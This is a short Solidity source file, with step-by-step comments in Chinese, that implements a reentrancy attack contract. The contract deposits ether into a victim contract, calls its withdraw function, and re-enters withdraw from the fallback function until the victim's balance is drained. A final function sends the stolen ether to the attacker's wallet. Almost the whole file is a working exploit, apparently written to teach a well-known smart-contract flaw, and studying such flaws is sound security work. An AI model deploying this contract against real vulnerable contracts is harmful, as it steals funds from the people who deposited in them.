pragma solidity ^0.4.18;

// 1. 定义接口，方便调用受害者合约
interface IReentrance {
    function depositFunds() public payable;
    function withdrawFunds(uint _amount) public;
}

contract Attacker {
    IReentrance public victim;
    address public owner;
    uint public stealAmount;

    // 构造函数：传入受害者合约的地址
    function Attacker(address _victimAddress) public {
        victim = IReentrance(_victimAddress);
        owner = msg.sender;
    }

    // 2. 攻击入口函数
    function attack() public payable {
        require(msg.value >= 1 ether);
        stealAmount = 1 ether;

        // 第一步：先存入资金，获得由于余额（成为合法用户）
        // 这里的 donate 是为了让 balances[address(this)] > 0
        victim.depositFunds.value(stealAmount)();

        // 第二步：发起第一次提款，点燃导火索
        victim.withdrawFunds(stealAmount);
    }

    // 3. Fallback 回退函数 - 攻击的核心！
    // 当受害者合约执行 msg.sender.call.value() 时，会自动触发这个函数
    function () public payable {
        // 检查受害者合约里还有没有钱
        if (address(victim).balance >= stealAmount) {
            // 再次调用 withdraw！
            // 此时受害者合约还没来得及执行 balances -= amount
            // 所以它认为我们还有余额
            victim.withdrawFunds(stealAmount);
        }
    }

    // 4. 销赃：把偷来的钱从攻击合约转到黑客的钱包
    function collectEther() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }
}